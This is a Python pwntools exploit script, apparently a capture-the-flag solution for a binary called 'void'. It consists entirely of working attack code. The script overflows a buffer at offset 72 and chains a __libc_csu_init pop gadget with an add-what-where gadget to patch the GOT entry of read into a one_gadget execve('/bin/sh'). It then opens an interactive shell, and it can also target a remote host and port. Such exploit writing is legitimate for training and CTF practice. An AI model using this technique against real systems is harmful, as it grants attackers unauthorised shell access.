#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('void')
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *main+26
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

""""
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

"""

def init():
    global io

    io = start()

def solve():
    offset = 72
    add_what_where = 0x0000000000401108 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
    csu_pop = 0x00000000004011b2 # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
    
    rbx = 0xfffdce9a
    rbp = exe.got['read'] + 0x3d
    r12 = 0x0
    r13 = 0x0
    r14 = 0x0
    r15 = 0x0

    read = exe.plt['read']

    payload = flat({
        offset: [
            csu_pop,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            r15,
            add_what_where,
            read
        ]
    })

    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()    

if __name__ == '__main__':
    main()

